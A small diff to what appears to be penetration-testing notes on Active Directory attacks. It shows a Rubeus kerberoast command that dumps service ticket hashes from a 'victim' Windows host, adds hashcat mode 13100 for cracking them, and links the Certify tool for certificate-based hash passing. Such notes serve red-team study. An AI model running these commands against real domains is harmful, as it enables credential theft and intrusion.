@@ -52,7 +52,7 @@
 
 - Windows (victim way)
 1. ``` .\Rubeus.exe kerberoast /outfile:hashes.kerberoast ```
-2. hashcat crack
+2. hashcat crack ``` 13100 ```
 
 ## Pass hash by certificate
 - https://github.com/GhostPack/Certify
